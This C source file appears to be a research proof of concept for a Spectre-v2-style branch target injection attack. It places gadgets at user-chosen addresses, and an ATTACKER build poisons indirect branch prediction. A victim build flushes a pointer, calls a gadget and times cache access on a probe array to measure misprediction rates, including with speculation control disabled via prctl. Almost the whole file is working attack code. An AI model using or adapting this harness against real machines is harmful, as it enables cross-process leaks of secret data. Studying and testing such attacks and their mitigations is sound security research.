#include "utils.h"
#include <stdio.h>
#include <string.h>
#include <sys/prctl.h>

#ifndef PRINT_AMMOUNT
#define PRINT_AMMOUNT 100000
#endif

#define IA32_SPEC_CTRL 72

uint8_t *rdiPtr;
uint8_t unused[0x500];
uint8_t probeArray[0x1000] = {2};
uint8_t unuse2[0x500];

uint32_t f1() {}

int poison(uint8_t *srcAddress, uint8_t *dstAddress, uint64_t cpu)
{
    volatile uint8_t d;

    unsigned tries = 0;
    unsigned hits = 0;
    unsigned totalHits = 0;
    unsigned totalTries = 0;

    jitForLoop(srcAddress);

    while (1)
    {

#ifdef ATTACKER
        callGadget(srcAddress, (uint8_t *)&rdiPtr, (uint8_t *)probeArray);
        continue;
#else

    
        d = *dstAddress;
        flush((uint8_t *)&rdiPtr);
        callGadget(srcAddress, (uint8_t *)&rdiPtr, (uint8_t *)probeArray);
    
        if (probe(&probeArray[0]) < THRESHOLD)
        {
            hits++;
            totalHits++;
        }

        totalTries++;
        if (++tries % PRINT_AMMOUNT == 0)
        {

            printf("Rate: %u/%u  \n", hits, tries);
            tries = 0;
            hits = 0;
            if (totalTries >= PRINT_AMMOUNT * 10)
            {
                break;
            }
        }
#endif

#ifdef SLEEP
        usleep(1);
#endif

    }

    printf("Total misspredict rate: %d/%d (%.2f %)\n", totalHits, totalTries, (float)totalHits * 100 / (float)totalTries);
}

int main(int argc, char **argv)
{

    uint64_t srcAddress;
    uint64_t dstAddress;
    uint64_t cpu;

    if (argc < 4)
    {
        printf("Usage:   %s <srcAddress> <dstAddress> <cpuCore> \n", argv[0]);
        printf("Example: %s 0x55555554123 0x55555555345 1 \n", argv[0]);
        return 0;
    }

    srcAddress = (uint64_t)strtoull(argv[1], NULL, 16);
    dstAddress = (uint64_t)strtoull(argv[2], NULL, 16);
    cpu = (uint64_t)strtoull(argv[3], NULL, 16);
    SetCoreAffinity(cpu);

    uint8_t *rwx1 = requestMem((uint8_t *)(srcAddress & (~0xfffULL)), 0x1000);
    uint8_t *rwx2 = requestMem((uint8_t *)(dstAddress & (~0xfffULL)), 0x1000);


// set up leak gadget into position
#ifdef ATTACKER
    rdiPtr = (uint8_t *)dstAddress;
    copyRetGadget(dstAddress);
#else
    rdiPtr = (uint8_t *)f1;
    copyLeakGadget(dstAddress);
    usleep(100000); //optional
    prctl(PR_SET_SPECULATION_CTRL, PR_SPEC_INDIRECT_BRANCH, PR_SPEC_FORCE_DISABLE, 0, 0);
#endif
    
    poison(srcAddress, dstAddress, cpu);

}
